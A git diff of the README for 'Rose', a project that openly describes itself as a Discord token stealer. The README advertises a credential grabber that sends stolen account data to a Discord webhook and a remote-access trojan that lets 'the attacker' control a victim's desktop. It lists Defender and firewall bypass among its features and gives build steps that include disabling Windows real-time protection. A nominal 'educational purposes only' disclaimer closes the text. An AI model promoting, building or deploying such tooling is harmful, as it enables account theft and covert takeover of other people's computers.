@@ -33,17 +33,12 @@
 <a href="https://discord.gg/">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
 
-#### 16/07/2023 - All Rose discord servers have been closed because of way too unethical decisions made by our community.
-#### 10/07/2023 - Do **NOT** use the options under the `Get Admin` category. Also do not use `Knight RAT`. We are working hard on solving the issues with these options.
-#### 11/06/2023 - Almost everything is working, however, to compile you *must disable real time protection for windows defender*.
-#### Encoutered an error while building? Join our [Discord](https://discord.gg/)! You will need to send us both .log files which are created while building.
-### A multipurpose advanced discord token stealer which is using a beautiful UI.
-
 ## <a id="table"></a> Table of contents
 
-- [Description](#description)
+- [Blog](#blog)
+- [What is this?](#whatisthis)
 - [Features](#features)
-- [Discord](https://discord.gg/gz5fUCkw8p)
+- [Discord](https://discord.gg/)
 - [Setup](#setup)
 - [Preview](#preview)
 - [Changelog](#changelog)
@@ -53,13 +48,22 @@
 - [Star History](#history)
 - [License](#lisence)
 
-## <a id="description"></a> Little description
+## <a id="blog"></a> Blog
+**We will keep you updated and remove specific warnings if the problems are solved.**
 
-Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://github.com/DamagingRose/Rose-RAT). We spent months of work on this amazing project. You won't really find a better tool than Rose!
+#### 16/07/2023 - All Rose discord servers have been closed because of way too unethical decisions made by our community.
+#### 10/07/2023 - Following functions are not available at the moment: `getadmin`, `malicious` and `knightrat`. Our team is already working hard on solving these problems.
+#### 11/06/2023 - Almost everything is working, however, to compile you *must disable real time protection for windows defender*.
+#### Encoutered an error while building? Join our [Discord](https://discord.gg/)! You will need to send us both .log files which are created while building.
+### A multipurpose advanced discord token stealer which is using a beautiful UI.
 
-[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) detects and collects user data from a PC and sends it to a Discord WebHook API.
+## <a id="whatisthis"></a> What is this?
 
-[Rose-RAT](https://github.com/DamagingRose/Rose-RAT) allows the attacker to control a victims desktop and his windows client overall with a beatiful attacker-client where you are able to execute commands from.
+**Our professional team spent months of work on this project and we hope you will enjoy your journey through the world of cybersecurity.**
+
+[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) collects account credentials sends it to a discord webhook API.
+
+[Rose-RAT](https://github.com/DamagingRose/Rose-RAT) allows the attacker to control a victims desktop with our application through commands.
 
 ## <a id="features"></a> Features
 
@@ -82,11 +86,12 @@ Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://
 - Diversity - Change the Icon, name and functions of your stub by yourself through the beautiful builder - WIP
 - Bypass/disable Windows Defender/Firewalls - WIP
 
-### <a id="setup"></a> Setup
+## <a id="setup"></a> Setup
+**Due to our professional installation mechanism you won't need to install python manually, our batch script does it automated for you.**
 
 - Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
-- Extract the .zip file by just right clicking on the file and clicking on extract ZIP or extract here.
-- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) file to open up the Rose builder or Python installer if it is not installed.
+- Extract the ZIP folder which you just downloaded.
+- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/start.bat) to have the [builder](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) open automatically.
 
 ## <a id="preview"></a> Preview
 
@@ -162,5 +167,5 @@ The author of this program is not liable for any damage, harm, or legal conseque
 ### This is for educational purposes only. Use at your own risk. We are not responsible for any of your actions!
 
 <div align=center>
-    <a href=#top>Back to top<br><a href=#table>Back to to table of contents
+    <a href=#top>Back to top</a><br><a href=#table>Back to to table of contents</a>
 </div>
